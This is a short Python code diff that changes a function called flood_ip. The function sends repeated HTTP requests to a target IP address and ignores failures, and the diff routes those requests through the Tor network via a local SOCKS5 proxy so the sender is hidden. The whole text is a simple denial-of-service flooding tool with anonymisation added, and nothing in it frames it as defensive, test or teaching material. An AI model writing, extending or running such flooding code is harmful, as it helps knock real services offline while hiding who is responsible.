@@ -5,8 +5,10 @@ import requests
 def flood_ip(ip_address, num_requests):
   for i in range(num_requests):
     try:
-      # Send a request to the IP address
-      requests.get("http://" + ip_address)
+      # Use the Tor network to send a request to the IP address
+      session = requests.Session()
+      session.proxies = {"http": "socks5://127.0.0.1:9050", "https": "socks5://127.0.0.1:9050"}
+      session.get("http://" + ip_address)
     except:
       # If the request fails, do nothing
       pass
